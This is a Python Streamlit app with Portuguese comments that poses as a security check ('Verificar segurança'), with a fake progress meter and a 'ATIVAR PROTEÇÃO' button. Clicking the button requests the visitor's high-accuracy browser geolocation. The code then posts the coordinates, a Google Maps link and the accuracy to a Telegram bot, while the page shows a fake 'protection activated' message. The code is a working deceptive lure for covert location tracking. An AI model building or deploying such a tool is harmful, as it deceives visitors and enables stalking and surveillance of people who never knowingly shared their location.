import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval

# ===============================
# CONFIGURAÇÃO TELEGRAM
# ===============================
TOKEN = "SEU_TOKEN_DO_BOT"
CHAT_ID = "SEU_CHAT_ID"

def enviar_telegram(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={
                "chat_id": CHAT_ID,
                "text": msg,
                "parse_mode": "Markdown",
                "disable_web_page_preview": True
            },
            timeout=5
        )
    except:
        pass

# ===============================
# CONFIG STREAMLIT
# ===============================
st.set_page_config(page_title="Segurança Ativa", layout="centered")

# ===============================
# CSS
# ===============================
st.markdown("""
<style>
body { background:#0b0e13; color:#fff; }
.circle {
    width:180px;height:180px;border-radius:50%;
    border:3px solid #2ecc71;
    display:flex;align-items:center;justify-content:center;
    box-shadow:0 0 40px rgba(46,204,113,.6);
    margin:auto;
}
.pct { font-size:44px;font-weight:bold; }
.btn {
    background:#3a3f46;
    color:#fff;
    width:100%;
    height:55px;
    border:none;
    border-radius:14px;
    font-size:18px;
    font-weight:bold;
}
.alert {
    background:#3a3f00;
    color:#fff;
    padding:16px;
    border-radius:12px;
}
</style>
""", unsafe_allow_html=True)

# ===============================
# INTERFACE
# ===============================
st.markdown("<h2 style='text-align:center'>Verificar segurança</h2>", unsafe_allow_html=True)

bolha = st.empty()
bolha.markdown(
    "<div class='circle'><div class='pct'>4%</div></div>",
    unsafe_allow_html=True
)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# ===============================
# SESSION STATE
# ===============================
if "pedindo_geo" not in st.session_state:
    st.session_state.pedindo_geo = False

# ===============================
# BOTÃO
# ===============================
if st.button("● ATIVAR PROTEÇÃO", use_container_width=True):
    st.session_state.pedindo_geo = True
    st.experimental_rerun()

# ===============================
# GEOLOCALIZAÇÃO (FASE 2)
# ===============================
if st.session_state.pedindo_geo:

    geo = streamlit_js_eval(
        js_expressions="""
        new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({
                    ok: true,
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                }),
                (err) => resolve({
                    ok: false,
                    error: err.code
                }),
                { enableHighAccuracy: true, timeout: 15000 }
            );
        })
        """,
        key="geo_final"
    )

    # ainda aguardando o usuário clicar em Permitir / Negar
    if geo is None:
        st.info("Aguardando permissão de localização…")
        st.stop()

    # usuário negou ou falhou
    if not geo.get("ok"):
        st.markdown(
            "<div class='alert'>Permissão de localização negada ou indisponível.</div>",
            unsafe_allow_html=True
        )
        st.session_state.pedindo_geo = False
        st.stop()

    # ===============================
    # SUCESSO
    # ===============================
    for i in range(4, 101, 4):
        bolha.markdown(
            f"<div class='circle'><div class='pct'>{i}%</div></div>",
            unsafe_allow_html=True
        )
        time.sleep(0.04)

    mapa = f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}"

    enviar_telegram(
        f"🛡️ PROTEÇÃO ATIVADA\n\n"
        f"📍 [Localização]({mapa})\n"
        f"🎯 Precisão: {int(geo['accuracy'])}m"
    )

    st.success("Proteção ativada com sucesso!")
    st.session_state.pedindo_geo = False
